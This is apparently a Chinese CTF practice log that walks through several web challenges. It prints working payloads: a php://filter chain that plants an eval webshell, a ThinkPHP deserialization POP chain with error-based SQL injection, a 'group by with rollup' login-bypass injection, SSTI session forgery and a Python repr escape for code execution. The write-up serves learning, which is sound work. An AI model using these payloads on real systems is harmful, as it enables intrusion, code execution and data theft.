# Day9-懒狗来打卡了

## 0x01 [WMCTF2020]Web Check in 2.0

绕过死亡exit，这是基本操作了，但是需要找到新的过滤器。懒狗想到这里就去看wp了。

```java
=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=6.php
```

还有一种方法是**segment**，就是那个qwb2021才考过的知识点。需要爆破，就不多说了

## 0x02 [CISCN2019 总决赛 Day1 Web3]Flask Message Board

这个题目到最后一步之前都挺简单的.....

![image-20220113093346679](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220113093346679.png)

存在`ssti`，但是好像有限制，{{config}}，获取到sercret_key,伪造session，访问/admin，拿到源码，发现有tensorflow的模型，默默点开了[wp](https://github.com/RManLuo/ciscn2019_final_web4)。发现需要使用**tensorboard**审计模型。

安装环境

```bash
conda activate tensorflow-py3.6
conda install tensorflow
pip install tensorboard
```

使用`tensorboard --logdir ./log`

## 0x03 [红明谷CTF 2021]EasyTP

堆叠注入或者报错注入。

```java
<?php
namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;
        public function __construct(){
            $this->img = new Memcache();

        }
    }
}


namespace Think\Session\Driver{
    use Think\Model;

    class Memcache {
        protected $handle;
        public function __construct(){
            $this->handle = new Model();

        }
    }

}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model {
        protected $data=array();
        protected $pk;
        protected $options=array();
        protected $db=null;

        public function __construct()
        {
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                'where'=>'1=1',
                'table'=>'mysql.user where 1=updatexml(1,concat(0x7e,user(),0x7e),1)#'

            );


        }
    }
}


//初始化数据库连接
namespace Think\Db\Driver{
    use PDO;
    class Mysql {

        protected $config     = array(
            'debug'             =>   true,
            "charset"           =>  "utf8",
            'type'              =>  'mysql',     // 数据库类型
            'hostname'          =>  'localhost', // 服务器地址
            'database'          =>  'thinkphp',          // 数据库名
            'username'          =>  'root',      // 用户名
            'password'          =>  'root',          // 密码
            'hostport'          =>  '3306',        // 端口
        );
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启后才可读取文件
            PDO::MYSQL_ATTR_MULTI_STATEMENTS => true,    //把堆叠开了，开启后可堆叠注入
        );


    }

}


namespace{
    echo base64_encode(serialize(new Think\Image\Driver\Imagick() ));
}


?>

```

## 0x04 [Black Watch 入群题]Web2

参考:https://blog.csdn.net/qq_44105778/article/details/89163304

https://blog.csdn.net/wangyuxiang946/article/details/120118721

```
我们使用万能用户名 a'/**/or/**/true/**/# 使SQL成立绕过用户名之后, 后台的SQL会查询出所有的用户信息, 然后依次判断查询处的用户名对应的密码和我们输入的密码是否相同, 这时候我们使用with rollup 对 group by 分组的结果再次进行求和统计, 由于with rollup 不会对group by 分组的字段( password)进行统计, 所以会在返回结果的最后一行用null来填充password, 这样一来我们的返回结果中就有了一个值为null的password , 只要我们登录的时候password输入框什么都不输, 那我么输入的password的值就是null, 跟查询出的用户密码相同( null == null), 从而登录成功
```

```
username=\&password=||1 group by token with rollup having token is NULL--+&question=1
```

分析一下这个payload，发现了一个新的语句，但是我不明白这个是干的？也不知道他在干嘛，注册普通用户默认token为0?,然后看token判断身份吗?

盲猜他的语句

```sql
select token from users where username= & password=
```

注入之后

```sql
select token from users where username="\" and passwrod=" ||  1 group by token with rollup having token is NULL--+"
```

精简一下

```sql
select token from users where username="a" || 1 group by token with rollup having token is NULL
```

最后返回的数据是token为null的一条数据。后面就是mysql链接，和一个目录绕过了

## 0x05 PyCalX 1&2

https://xz.aliyun.com/t/2456

其实这个题目最关键的位置在`repr`函数，他会引入单引号，导致逃逸，然后就可以使用两个特性

```
f'{}' 的代码执行
```

然后通过`source`来引入无法主测的变量。

两个payload就是`print(str(repr("a"))+str("+'")+str(repr("< b#")))`

## 0x06 [SWPUCTF 2016]Web7

CRLF+SSRF 无脑so

